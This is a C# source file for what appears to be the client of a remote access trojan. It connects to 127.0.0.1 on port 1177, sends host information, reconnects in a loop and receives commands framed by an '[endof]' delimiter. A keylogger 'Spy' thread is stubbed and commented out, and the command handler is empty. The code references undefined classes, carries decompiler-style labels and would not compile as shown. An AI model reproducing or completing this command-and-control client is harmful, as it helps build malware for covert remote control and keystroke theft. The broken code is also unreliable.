using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.Remoting;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ty
{
    class Program
    {
        public static TcpClient tcp = null;
        private static bool ON;
        private static MemoryStream MeM;
        private static byte[] Message;

        static void Main(string[] args)
        {
            Class1<int> d=new Class1<int>();
            Thread thread = new Thread(Listen, 1);
            thread.Start();
            try
            {
             //   Spy mSpy = new Spy();
              //  thread = new Thread(mSpy.LoggerThread, 1);
              //  thread.Start();
            }
            catch (E expr_15A)
            {
                Environment.Exit(09);
            }

        }

        private class Spy
        {
            public void LoggerThread()
            {
              
            }
        }

        private static void Listen()
        {
           
                while (true)
                {
                    if (tcp != null)
                    {
                        try
                        {
                            while (ON)
                            {
                                if (tcp.Available > 0)
                                {
                                    Message = new byte[tcp.Client.Available - 1 + 1];
                                    int num = tcp.Client.Receive(Message, 0, Message.Length, SocketFlags.None);
                                    if (num <= 0)
                                    {
                                        break;
                                    }
                                    MeM.Write(Message, 0, num);
                                    while (true)
                                    {
                                        byte[] array = MeM.ToArray();
                                        if (!Encoding.Default.GetString(array).Contains(endof))
                                        {
                                            break;
                                        }
                                        List<byte[]> array2;
                                        Thread thread;
                                       
                                        if (UiUnknown(out array2)) break;
                                    }
                                }
                                else
                                {
                                    int num2 = tcp.GetStream().ReadByte();
                                    if (num2 == -1)
                                    {
                                        break;
                                    }
                                    MeM.WriteByte((byte)num2);
                                }
                                Thread.Sleep(1);
                            }
                        }
                        catch (Exception expr_1AD)
                        {
                            
                        }
                    }
                IL_1C9:
                    ON = false;
                    Thread.Sleep(2500);
                    if (connect())
                    {
                        ON = true;
                        continue;
                    }
                    goto IL_1C9;
                }
            
        }
       

        private static bool UiUnknown(out List<byte[]> array2)
        {
            array2 = Fx(MeM.ToArray(), endof);
            Thread thread = new Thread(Ind);
            thread.Start(array2[0]);
                
            thread.Join(200);
            MeM.Dispose();
            MeM = new MemoryStream();
            if (array2.Count != 2)
            {
                return true;
            }
            MeM.Write(array2[1]
            , 0,array2[1].Length
               );
            return false;
        }

        private static void Ind(object a0)
        {
            
        }

        public static bool connect()
        {
           // FileInfo lO = AppFileInfo;
            //Monitor.Enter(lO);
            bool result = false;
            try
            {
                try
                {
                    if (tcp != null)
                    {
                        try
                        {
                            tcp.Client.Disconnect(false);
                        }
                        catch (E e)
                        {
                            e.Report();
                        }
                        try
                        {
                            tcp.Close();
                            tcp = null;
                        }
                        catch (E e)
                        {
                            e.Report();
                        }
                    }
                    try
                    {
                        if(MeM!=null)
                        MeM.Dispose();
                    }
                    catch (E e)
                    {
                        e.Report();
                    }
                    MeM = new MemoryStream();
                    try
                    {
                       // if (Pro != null)
                        {
                     //       Pro.Kill();
                       //     Pro = null;
                        }
                    }
                    catch (E e)
                    {
                       e.Report();
                    }
                }
                catch (E e)
                {
                    e.Report();
                }
                try
                {
                    tcp = new TcpClient();
                    Thread.Sleep(1000);
                    tcp.Connect("127.0.0.1", 1177);
                    ON = true;
                    Send(m.Info());
                    if (!ON)
                    {
                        result = false;
                    }
                    else
                    {
                        result = true;
                    }
                }
                catch (E e)
                {
                   
                    e.Report();
                }
            }
            finally
            {
                
            }
            return result;
        }
        public static List<byte[]> Fx(byte[] b,string spl)
        {
            
            var list = new List<byte[]>();
            var first = new MemoryStream();
            var socand = new MemoryStream();
            string[] split = Encoding.Default.GetString(b).Split(new[]{ spl},StringSplitOptions.None);
            first.Write(b, 0, split[0].Length);
           
                socand.Write(b, split[0].Length + spl.Length, b.Length - (split[0].Length + spl.Length));
                list.Add(first.ToArray());
                list.Add(socand.ToArray());
                first.Dispose();
                socand.Dispose();
                return list;
            
        }
        public static bool Sendbytes(byte[] b)
        {
            if (!ON)
            {
                return false;
            }
            //FileInfo lO = AppFileInfo;
            //Monitor.Enter(lO);
            bool result;
            try
            {
                if (ON)
                {
                    try
                    {
                        var memoryStream = new MemoryStream();
                        memoryStream.Write(b, 0, b.Length);
                        memoryStream.Write(GetBytes(endof), 0, endof.Length);
                        tcp.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
                        memoryStream.Dispose();

                        return true;
                    }
                    catch (E er)
                    {
                        er.Report();
                        try
                        {
                            if (ON)
                            {
                                tcp.Close();
                            }
                        }
                        catch (E e)
                        {
                            e.Report();
                        }
                        ON = false;

                        
                        return false;
                    }
                }
                result = false;
            }
            finally
            {
                
            }
            return false;
        }

        public const string endof = "[endof]";

        public static bool Send(string S)
        {
            return Sendbytes(GetBytes(S));
        }

        private static byte[] GetBytes(string s)
        {
            return Encoding.Default.GetBytes(s);
        }

        class E :Exception
        {
            public void Report()
            {
                Console.Out.Write(this.Message);
            }
        }
      
    }
}
